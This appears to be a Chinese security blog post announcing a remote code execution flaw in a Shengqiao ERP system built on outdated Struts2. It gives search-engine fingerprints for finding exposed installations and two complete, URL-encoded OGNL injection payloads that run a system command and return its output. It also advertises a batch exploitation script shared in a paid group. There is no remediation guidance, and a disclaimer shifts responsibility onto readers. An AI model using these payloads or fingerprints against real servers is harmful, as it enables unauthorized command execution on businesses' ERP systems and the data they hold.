#  某乔ERP系统存在RCE漏洞，附POC脚本！   
原创 狐狸  狐狸说安全   2024-11-26 01:24  
  
**免责声明**  
  
由于传播、利用本公众号狐狸说安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号  
狐狸说安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！  
### 0x01 概述  
  
杭州圣乔科技有限公司主要研发全套工业企业ERP系列软件产品，现在公司已经形成ERP 软件、OA办公管理、等四大系列二十小类软件产品。致力于为政府、教育、医疗卫生、文化事业、公共事业（电、水、气等）、交通、住建、应急、金融、电信运营商、企业等用户提供专业的信息化、智能化、数字化服务。  
### 0x02 正文  
  
**Fofa指纹：app="圣乔-ERP系统"******  
  
**鹰图指纹：web.icon="d2c808114296ddd9e76e9c774d79bd43"******  
  
由于此ERP系统使用Struts2开发框架组件，均存在历史遗留漏洞，可直接利用Struts2的Nday漏洞进行渗透攻击  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwa5EAPE7VX89OLykRz77Ry8QwxRh9e9nUXfrQo3LAYH0zXDNLUZicAmGACXJrk0zQxa08SibIia2jw7Q/640?wx_fmt=png&from=appmsg "")  
  
  
执行whoami命令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwa5EAPE7VX89OLykRz77Ry8SCnpDkl4wQN2mopuCpoer08jSwSU5nSdv9IfWtSTgOpIPBUplGgprw/640?wx_fmt=png&from=appmsg "")  
  
**POC：**  
  
payload1：  
```
screen.width=1&screen.height=1&encode=1&operate=11&UI=0&user=1&password=c4ca4238a0b923820dcc509a6f75849b&switching=true&redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22whoami%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D=1
```  
  
payload2：  
```
screen.width=1&screen.height=1&encode=1&operate=11&UI=0&user=1&password=c4ca4238a0b923820dcc509a6f75849b&switching=true&redirect:%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22whoami%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D&cachePass=1
```  
  
也可以使用专项检测利用工具进行识别攻击  
  
**批量化脚本：**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/pH5fZ5lvwwa5EAPE7VX89OLykRz77Ry8vWtawwIxlyjJePPdOGtEaMbfvrI4mhibHQjPw60n6ntKHDaB6xODVJw/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwa5EAPE7VX89OLykRz77Ry8ATYBrrX3f1gPGCzLGR98SufzlA1ia2TriciaOwiaPibicWf0YoicictBrbEDHQ/640?wx_fmt=png&from=appmsg "")  
  
  
**0x03结尾**  
  
POC批量化测试脚本已经在很早之前传至纷传圈子上了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwa5EAPE7VX89OLykRz77Ry8kJABTWc9dKWVzHg0dz1bcwIf5OIwnepec3dgq1RDWlPzQjy0RKIpIA/640?wx_fmt=png&from=appmsg "")  
  
  
**0x04内部圈子**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/pH5fZ5lvwwa5EAPE7VX89OLykRz77Ry8gOE6649Ddcfp7HaaFBoKjzWXCZ3iavTGMTeYEj9jgWKVcFFdULqbia3w/640?wx_fmt=jpeg&from=appmsg "")  
  
